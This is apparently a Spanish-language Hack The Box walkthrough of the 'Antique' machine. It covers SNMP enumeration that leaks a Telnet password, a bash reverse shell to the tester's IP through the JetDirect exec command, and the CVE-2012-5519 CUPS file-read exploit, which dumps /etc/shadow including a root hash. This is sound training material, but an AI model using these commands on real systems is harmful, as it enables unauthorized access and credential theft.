---
layout: single
title: Antique - Hack The Box
excerpt: "Esta fue una máquina bastante interesante, haciendo los escaneos correspondientes, únicamente, encontramos un puerto abierto que corre el servicio Telnet, al no encontrar nada más, buscamos por UDP y encontramos el puerto 161 donde corre el servicio SNMP. De ahí, encontramos la contraseña para acceder a Telnet y abusando de los privilegios, obtenemos una shell de forma remota. Para escalar privilegios, utilizamos el privilegio lpadmin y el CVE-2012-5519 para explotarlo y obtener la flag del Root."
date: 2023-05-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-antique/antique_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Telnet
  - UDP Scan
  - SNMP
  - Abusing Telnet Privileges
  - CUPS 1.4.4
  - lpadmin Privilege Exploitation
  - CVE-2012-5519
  - OSCP Style
---
![](/assets/images/htb-writeup-antique/antique_logo.png)
Esta fue una máquina bastante interesante, haciendo los escaneos correspondientes, únicamente, encontramos un puerto abierto que corre el servicio **Telnet**, al no encontrar nada más, buscamos por **UDP** y encontramos el **puerto 161** donde corre el servicio **SNMP**. De ahí, encontramos la contraseña para acceder a **Telnet** y abusando de los privilegios, obtenemos una shell de forma remota. Para escalar privilegios, utilizamos el privilegio **lpadmin** y el CVE-2012-5519 para explotarlo y obtener la flag del **Root**.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
				<li><a href="#Telnet">Analizando Servicio Telnet</a></li>
				<li><a href="#UDP">Escaneo de Puertos UDP</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#SNMP">Utilizando Herramienta snmpwalk</a></li>
				<li><a href="#Hexa">Descifrando Números Hexadecimales</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Telnet2">Obteniendo una Shell desde Servicio Telnet</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#lpadmin">Utilizando Privilegio lpadmin para Ser Root</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.11.107
PING 10.10.11.107 (10.10.11.107) 56(84) bytes of data.
64 bytes from 10.10.11.107: icmp_seq=1 ttl=63 time=144 ms
64 bytes from 10.10.11.107: icmp_seq=2 ttl=63 time=142 ms
64 bytes from 10.10.11.107: icmp_seq=3 ttl=63 time=142 ms
64 bytes from 10.10.11.107: icmp_seq=4 ttl=63 time=141 ms

--- 10.10.11.107 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3013ms
rtt min/avg/max/mdev = 141.338/142.254/144.018/1.049 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:19 CST
Initiating SYN Stealth Scan at 13:19
Scanning 10.10.11.107 [65535 ports]
Discovered open port 23/tcp on 10.10.11.107
Completed SYN Stealth Scan at 13:19, 27.66s elapsed (65535 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (1.6s latency).
Scanned at 2023-05-17 13:19:14 CST for 28s
Not shown: 55477 filtered tcp ports (no-response), 10057 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.89 seconds
           Raw packets sent: 126562 (5.569MB) | Rcvd: 10125 (405.020KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

A canijo, nada más hay un puerto abierto y el servicio **Telnet**, no recuerdo haberlo explotado antes. Veamos que nos dice el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>
```
nmap -sC -sV -p23 10.10.11.107 -oN targeted                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:20 CST
Nmap scan report for 10.10.11.107
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.93%I=7%D=5/17%Time=646528FF%P=x86_64-pc-linux-gnu%r(NULL
SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
SF:irect\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.27 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Tardo bastante en hacer el escaneo y no veo algo que nos sea útil, por lo que vamos a analizar el servicio **Telnet**.

<h2 id="Telnet">Analizando Servicio Telnet</h2>

Entremos al servicio:
```
telnet 10.10.11.107 23                                       
Trying 10.10.11.107...
Connected to 10.10.11.107.

HP JetDirect

Password:
```
Pues no tenemos una contraseña, pero nos menciona algo, busquemos que es **HP JetDirect**:

**Los servidores de impresión HP JetDirect le permiten conectar impresoras y otros dispositivos directamente a una red. Conectados directamente a la red, los dispositivos pueden ubicarse cómodamente cerca de los usuarios.**

Changos, esto va a ser un poco difícil, porque no tenemos ni contraseña y es el único puerto abierto que encontramos...en **TCP**, es momento de buscar si hay algún puerto abierto en **UDP**.

<h2 id="UDP">Escaneo de Puertos UDP</h2>

Esta clase de escaneos puede ser demasiado tardada, pues puede durar hasta más de 1 hora, por lo que vamos a utilizar distintos parámetros con tal de reducir el tiempo lo más que se pueda:
```
nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107 -oN udpScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:52 CST
Initiating Ping Scan at 13:52
Scanning 10.10.11.107 [4 ports]
Completed Ping Scan at 13:52, 0.16s elapsed (1 total hosts)
Initiating UDP Scan at 13:52
Scanning 10.10.11.107 [100 ports]
Warning: 10.10.11.107 giving up on port because retransmission cap hit (2).
Discovered open port 161/udp on 10.10.11.107
Completed UDP Scan at 13:53, 10.18s elapsed (100 total ports)
Nmap scan report for 10.10.11.107
Host is up (0.14s latency).
Not shown: 83 open|filtered udp ports (no-response), 16 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds
           Raw packets sent: 323 (18.717KB) | Rcvd: 18 (1.531KB)
```
* -sU: Para indicar un escaneo por UDP.
* --top-ports: Para indicar que se escaneen los puertos más comunes.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -T#: Para controlar el temporizado y rendimiento para ir lo más rápido posible, tiene un rango de 1 a 5 (este es útil solo en ambientes controlados, pues a mayor rango, mayor el riesgo de ser descubiertos).
* -v: Un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -oN: Para indicar que el output se guarde en un fichero. Lo llamé udpScan.

Aquí información que nos comparte NMAP sobre esta clase de escaneos:
* https://nmap.org/book/scan-methods-udp-scan.html

Y nos muestra un puerto abierto, que es del servicio **SNMP**, busquemos información sobre este servicio:

**El Protocolo simple de administración de red o SNMP (del inglés Simple Network Management Protocol) es un protocolo de la capa de aplicación que facilita el intercambio de información de administración entre dispositivos de red.**

Excelente, ya sabemos por donde comenzaremos a vulnerar la máquina. En el siguiente blog, se explica como enumerar este servicio:
* https://hackinglethani.com/es/protocolo-snmp/


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="SNMP">Utilizando Herramienta snmpwalk</h2>

De acuerdo al blog que vimos, vamos a utilizar la herramienta **snmpwalk**.

Esta herramienta nos sirve para enumerar el servicio SNMP, aunque puede no funcionar. Te dejo más información en el siguiente link:
* https://www.ionos.mx/digitalguide/servidores/know-how/tutorial-de-snmp/

Con la herramienta **snmpwalk** no se solicita tan solo un registro de datos concreto del dispositivo SNMP, sino también registros de datos que le sigan (útil en el caso de tablas, por ejemplo).

Utilizaremos los ejemplos que vienen en la página, pero nos pide el parámetro **OID**, veamos lo que nos dice la herramienta sobre este parámetro:

**Se puede proporcionar un identificador de objeto (OID) en la línea de comando. Este OID especifica qué parte del espacio del identificador de objeto se buscará mediante solicitudes GETNEXT.**

**Se consultan todas las variables en el subárbol debajo del OID dado y se presentan sus valores al usuario. Cada nombre de variable se da en el formato especificado en variables(5). Si no hay un argumento OID presente, snmpwalk buscará el subárbol enraizado en SNMPv2-SMI::mib-2 (incluidos los valores de objetos MIB de otros módulos MIB, que se definen como pertenecientes a este subárbol).**

**Si la entidad de la red tiene un error al procesar el paquete de solicitud, se devolverá un paquete de error y se mostrará un mensaje que ayudará a identificar por qué la solicitud se formó incorrectamente. Si la búsqueda en árbol provoca intentos de búsqueda más allá del final de la MIB, se mostrará el mensaje "Fin de la MIB".**

Entonces, debemos indicar un **OID** entre un rango de 1 a 5, además, para obtener este los indicadores de objeto de SNMP como **SNMPv2-SMI::mib-2** es necesario un **Management Information Base (MIBS)**, que está incluido en una librería, vamos a instalarla:
```
apt install snmp-mibs-downloader
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
...
...
...
```
Ahora, hagamos una prueba rápida con un ejemplo que viene en la página, pero sin el **OID**:
```
snmpwalk -v1 -c public 10.10.11.107                               
iso.3.6.1.2.1 = STRING: "HTB Printer"
```
Como puedes ver, los identificadores de SNMP aparecen como números, para cambiar eso, modificamos el archivo **/etc/snmp/snmp.config** y comentamos la única línea que no está comentada:
```
nano /etc/snmp/snmp.conf
# mibs :
```
Volvemos a probar y nos debería marcar como menciona el manual:
```
snmpwalk -v1 -c public 10.10.11.107
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
```
Listo. Ahora sí, vamos a utilizar cualquier ejemplo de la herramienta que nos muestran en la página web, pero con un **OID**:
```
snmpwalk -v1 -c public 10.10.11.107 1
SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
Si intentas con otro número que no sea 1, saldrá error.

Veo que nos muestra varios números en hexadecimal, vamos a tratar de descifrar que son estos números.

<h2 id="Hexa">Descifrando Números Hexadecimales</h2>

Lo que haremos, será convertir los números hexadecimales en binario para ver si hay algún mensaje oculto.

Primero copiemos los números en nuestra máquina:
```
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135"                     
50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
Con **xargs**, te aparecerán más ordenados:
```
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs
50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
Para convertir estos números a binario, vamos a usar la herramienta **xxd** con algunos parámetros:
```
echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r 
P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5
```
Excelente, ya tenemos algo, lo que parece ser una contraseña, pero no sé hasta qué punto sería para probarla y el único servicio en el que podemos probar, es el de **Telnet**.

Probemos.
```
telnet 10.10.11.107 23                                       
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect


Password: P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
Vaya, pues era todo eso. Algo curioso que nos muestra, es que podemos usar el comando **exec** para ejecutar comandos del sistema. Aprovechémonos de esto.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Telnet2">Obteniendo una Shell desde Servicio Telnet</h2>

Probemos primero el comando que viene en el mensaje:
```
...
exec: execute system commands (exec id)
exit: quit from telnet session
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```
Bien, probemos otros comandos:
```
> exec ls
telnet.py
user.txt
> exec ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```
Muy bien, ahora si, vamos a obtener esa shell, por pasos:
* Abre una netcat:
```
nc -nvlp 443                  
listening on [any] 443 ...
```
* Utiliza el siguiente comando para obtener la shell:
```
exec bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1"
```
* Vuelve a observar la netcat y ya debería estar conectado a la máquina:
```
nc -nvlp 443                  
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.107] 58544
bash: cannot set terminal process group (1007): Inappropriate ioctl for device
bash: no job control in this shell
lp@antique:~$ whoami
whoami
lp
lp@antique:~$ ls
ls
telnet.py
user.txt
lp@antique:~$ cat user.txt
cat user.txt
...
```
Excelente, ya obtuvimos la flag del usuario, es momento de buscar la forma de convertirnos en Root.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>

Antes de continuar, te recomiendo conseguir una shell interactiva. Esta vez, lo voy a mostrar de forma distinta, porque si lo hacemos como siempre, nos saldrá esto:
```
lp@antique:~$ ls
ls
telnet.py
user.txt
lp@antique:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
This account is currently not available.
Script done, file is /dev/null
```
Entonces, vamos a hacerlo con Python, por pasos:
* Verifica que tenga Python la máquina:
```
lp@antique:~$ which python
which python
lp@antique:~$ which python3
which python3
/usr/bin/python3
```
* Utiliza Python para spawnear una shell de bash:
```
lp@antique:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
* Oprime **ctrl + z** y escribe lo siguiente:
```
lp@antique:~$ ^Z
zsh: suspended  nc -nvlp 443
stty raw -echo; fg
```
* Rápidamente, escribe:
```
stty raw -echo; fg
[1]  + continued  nc -nvlp 443
                              reset xterm
```
* Una vez obtenida la shell, exporta la XTERM, SHELL y cambia la stty:
```
lp@antique:~$ export TERM=xterm
lp@antique:~$ export SHELL=bash
lp@antique:~$ stty rows 51 columns 189
```
Listo, ya tenemos la shell interactiva.

<h2 id="lpadmin">Utilizando Privilegio lpadmin para Ser Root</h2>

Cuando revisamos los privilegios que tenemos, vemos que está el **lpadmin**, busquemos un Exploit para este. Aquí hay uno:
* https://github.com/p1ckzi/CVE-2012-5519

Vamos a utilizarlo, tal cual como menciona el GitHub. Vamos por pasos:
* Verifica que tengamos la herramienta **curl**:
```
lp@antique:~$ which curl
/usr/bin/curl
```
Si lo tiene, entonces si podemos usar este Exploit.
* Descarga el Exploit en tu máquina:
```
wget https://raw.githubusercontent.com/p1ckzi/CVE-2012-5519/main/cups-root-file-read.sh
--2023-05-17 16:40:30--  https://raw.githubusercontent.com/p1ckzi/CVE-2012-5519/main/cups-root-file-read.sh
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.111.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 13027 (13K) [text/plain]
Grabando a: «cups-root-file-read.sh»
cups-root-file-read.sh            100%[============================================================>]  12.72K  --.-KB/s    en 0s      
2023-05-17 16:40:31 (33.2 MB/s) - «cups-root-file-read.sh» guardado [13027/13027]
```
* Abre un servidor en Python:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* Desde la máquina víctima, vamos a descargarlo:
```
lp@antique:~$ wget http://Tu_IP/cups-root-file-read.sh
--2023-05-17 22:41:31--  http://10.10.14.9/cups-root-file-read.sh
Connecting to 10.10.14.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13027 (13K) [text/x-sh]
Saving to: ‘cups-root-file-read.sh’
cups-root-file-read.sh   0%[                                                                 
cups-root-file-read.sh  100%[====================================================================================================>]  12.72K  --.-KB/s    in 0.02s   
2023-05-17 22:41:31 (754 KB/s) - ‘cups-root-file-read.sh’ saved [13027/13027]
```
* Démosle permisos de ejecución:
```
lp@antique:~$ chmod +x cups-root-file-read.sh
```
* Ejecutalo:
```
lp@antique:~$ ./cups-root-file-read.sh 
  ___      __     ___     -----   _     _   
 / __| | | | '_ \/ __|_____| '__/ _ \ / _ \| __|____                                                                                   
| (__| |_| | |_) \__ \_____| | | (_) | (_) | ||_____|                                                                                  
 \___|\__,_| .__/|___/     |_|  \___/ \___/ \__|                                                                                       
 / _(_) | _|_|      _ __ ___  __ _  __| |  ___| |__                                                                                    
| |_| | |/ _ \_____| '__/ _ \/ _` |/ _` | / __| '_ \                                                                                   
|  _| | |  __/_____| | |  __/ (_| | (_| |_\__ \ | | |                                                                                  
|_| |_|_|\___|     |_|  \___|\__,_|\__,_(_)___/_| |_|                                                                                  
a bash implementation of CVE-2012-5519 for linux.
[i] performing checks...
[i] checking for cupsctl command...
[+] cupsctl binary found in path.                                                                                                      
[i] checking cups version...
[+] using cups 1.6.1. version may be vulnerable.                                                                                       
[i] checking user lp in lpadmin group...
[+] user part of lpadmin group.                                                                                                        
[i] checking for curl command...
[+] curl binary found in path.                                                                                                         
[+] all checks passed.                                                                                                                 
[!] warning!: this script will set the group ownership of                                                                              
[!] viewed files to user 'lp'.                                                                                                         
[!] files will be created as root and with group ownership of                                                                          
[!] user 'lp' if a nonexistant file is submitted.                                                                                      
[!] changes will be made to /etc/cups/cups.conf file as part of the                                                                    
[!] exploit. it may be wise to backup this file or copy its contents                                                                   
[!] before running the script any further if this is a production                                                                      
[!] environment and/or seek permissions beforehand.                                                                                    
[!] the nature of this exploit is messy even if you know what you're looking for.                                                      
[i] usage:
        input must be an absolute path to an existing file.
        eg.
        1. /root/.ssh/id_rsa
        2. /root/.bash_history
        3. /etc/shadow
        4. /etc/sudoers ... etc.
[i] ./cups-root-file-read.sh commands:
        type 'info' for exploit details.
        type 'help' for this dialog text.
        type 'quit' to exit the script.
[i] for more information on the limitations
[i] of the script and exploit, please visit:
[i] https://github.com/0zvxr/CVE-2012-5519/blob/main/README.md
[>]
```
Bien, nos explica que podemos enumerar archivos de la máquina con solo poner el archivo que queramos, por ejemplo, el **/etc/shadow**.

* Prueba a ver el **/etc/shadow**:
```
[>] /etc/shadow
[+] contents of /etc/shadow:
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
...
...
```
Excelente, entonces podemos ver cualquier archivo que queramos, recuerda que la flag, siempre está en la carpeta root. Vamos a ver si la puede mostrar:
```
[>] /root/root.txt                                                                                                                     
[+] contents of /root/root.txt:
...
```
Listo, ya tenemos la completada la máquina.

El mismo GitHub nos menciona lo siguiente de este Exploit:

**Este script aprovecha una vulnerabilidad en CUPS (sistema de impresión común de UNIX) < 1.6.2. CUPS permite a los usuarios del grupo lpadmin realizar cambios en el archivo cupsd.conf con el comando cupsctl. Este comando también permite al usuario especificar una ruta de ErrorLog. Cuando el usuario visita la página '/admin/log/error_log', el demonio cupsd que se ejecuta con un SUID de root lee la ruta de ErrorLog y la repite en texto sin formato. En resumen, los archivos propiedad del usuario raíz se pueden leer si la ruta de ErrorLog se dirige allí.**

Ese sistema **CUPS** está activa de manera local en el **puerto 631**, el problema es que para poder ver esta página, tendremos que configurar un servidor con una herramienta llamada **chisel** y de momento, no tengo tiempo. Pero tú puedes intentarlo o esperar a que lo exponga en este post después.

Si bien, es útil utilizar el Exploit, también podemos obtener resultados, solamente utilizando **cupsctl** y **curl** de la siguiente manera:
```
lp@antique:~$ cupsctl ErrorLog=/etc/shadow && curl 'http://localhost:631/admin/log/error_log'
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
...
```
Y de esta forma, también podemos obtener la flag:
```
lp@antique:~$ cupsctl ErrorLog=/root/root.txt && curl 'http://localhost:631/admin/log/error_log'
...
```
Tiene que ser forzosamente de esta manera, porque si solo utilizamos **cupsctl** no obtendremos resultados:
```
lp@antique:~$ cupsctl ErrorLog=/etc/shadow
lp@antique:~$ cupsctl ErrorLog=/root/root.txt
```

Podemos utilizar otro Exploit llamado **The Dirty Pipe**, eso puedes tomarlo como tarea para que veas otra clase de ataque, pues es reciente el descubrimiento de la vulnerabilidad.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://nmap.org/book/scan-methods-udp-scan.html
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
* https://hackinglethani.com/es/protocolo-snmp/
* https://www.ionos.mx/digitalguide/servidores/know-how/tutorial-de-snmp/
* https://github.com/p1ckzi/CVE-2012-5519


<br>
# FIN
